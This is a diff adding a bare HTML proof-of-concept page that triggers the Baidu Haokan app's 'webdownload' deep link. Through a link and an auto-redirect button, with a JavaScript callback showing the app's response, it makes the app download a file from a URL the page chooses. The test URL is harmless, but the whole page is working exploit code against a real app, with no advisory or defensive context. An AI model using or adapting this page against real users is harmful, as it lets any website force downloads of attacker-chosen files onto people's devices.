@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Download POC</title>
+    <style>
+        body { padding: 20px; background: #111; color: #0f0; }
+        .btn { display: inline-block; background: #00ff88; color: #000; padding: 15px 30px; text-decoration: none; border-radius: 8px; margin: 10px; font-weight: bold; }
+    </style>
+</head>
+<body>
+    <h2>📥 文件下载 POC</h2>
+    
+    <p>方式1: 点击下方链接触发</p>
+    <a class="btn" href="baiduhaokan://action/webdownload?params=%7B%22type%22%3A%22startdownload%22%2C%22url%22%3A%22https%3A%2F%2Fhttpbin.org%2Frobots.txt%22%2C%22file_id%22%3A%22poc_test%22%2C%22callback%22%3A%22cb%22%7D">
+        🔗 点击下载测试文件
+    </a>
+    
+    <p>方式2: 直接跳转（可能不行）</p>
+    <button onclick="window.location.href='baiduhaokan://action/webdownload?params=%7B%22type%22%3A%22startdownload%22%2C%22url%22%3A%22https%3A%2F%2Fhttpbin.org%2Frobots.txt%22%2C%22file_id%22%3A%22poc_test2%22%2C%22callback%22%3A%22cb%22%7D'">
+        🚀 自动触发
+    </button>
+    
+    <p id="status">等待操作...</p>
+    
+    <script>
+    window.cb = function(data) {
+        document.getElementById('status').innerText = '✅ 回调: ' + JSON.stringify(data);
+        alert('下载回调: ' + JSON.stringify(data));
+    };
+    </script>
+</body>
+</html>
